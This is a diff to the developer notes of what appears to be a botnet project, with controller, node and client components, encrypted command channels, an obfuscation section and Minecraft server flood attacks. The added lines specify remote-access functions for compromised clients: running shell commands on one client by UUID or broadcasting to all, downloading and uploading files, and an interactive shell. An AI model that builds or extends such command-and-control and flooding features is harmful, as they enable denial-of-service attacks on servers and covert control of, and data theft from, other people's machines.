@@ -39,6 +39,9 @@ All components must be run from their own directory (working dir = component roo
 - Every message has a 2-byte big-endian length prefix (`BUFFER_SIZE_LENGTH` in `*/core/constants.py`)
 - Key exchange: PEM RSA-2048 pubkeys, then auth JSON with `role` + RSA-PSS signature
 - Commands to clients: AES-256-GCM session key wrapped with RSA-OAEP
+- Responses from clients (exec/shell/download/upload): same AES-GCM pattern reversed (client→node)
+- Node `send_to()` accepts `expect_response` flag; RESPONSE_ACTIONS = {exec, download, upload, shell}
+- Commands can target a specific client by UUID (`"target": "<uuid>"`) or broadcast to all
 - Node auto-accepts both `controller` and `client` roles in the same TCP listener (port 547)
 - Default port = 547
 
@@ -52,6 +55,10 @@ All components must be run from their own directory (working dir = component roo
 - MCHANDSHAKE: rapid minecraft handshake connections, MCLOGIN: full login with keepalive, MCPING: status+ping requests
 - Controller prompts for confirmation before sending flood commands
 - `flood` commands require confirmation prompt (`y/N`)
+- `exec <node_id> <client_id> <command>` — run shell command on specific client, get stdout/stderr back
+- `download <node_id> <client_id> <path>` — download file from client (base64, saved locally)
+- `upload <node_id> <client_id> <local_file> <remote_path>` — upload file to client
+- `shell <node_id> <client_id>` — interactive shell (loop: send command → show output, type `exit` to quit)
 
 ## String obfuscation
 
